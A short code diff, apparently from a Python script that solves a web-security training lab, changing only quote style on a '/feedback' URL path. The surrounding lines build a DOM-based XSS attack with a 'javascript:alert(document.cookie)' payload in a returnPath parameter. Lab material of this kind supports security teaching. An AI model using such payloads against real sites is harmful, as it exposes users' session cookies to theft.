@@ -48,7 +48,7 @@ def verify_lab_solved(url):
 
 
 def solve_lab(url, proxies):
-    url = urljoin(url, '/feedback')
+    url = urljoin(url, "/feedback")
     params = {"returnPath": "javascript:alert(document.cookie)"}
     print_info(
         f'Performing DOM-based XSS attack by visiting "{url}" with the following parameters:'
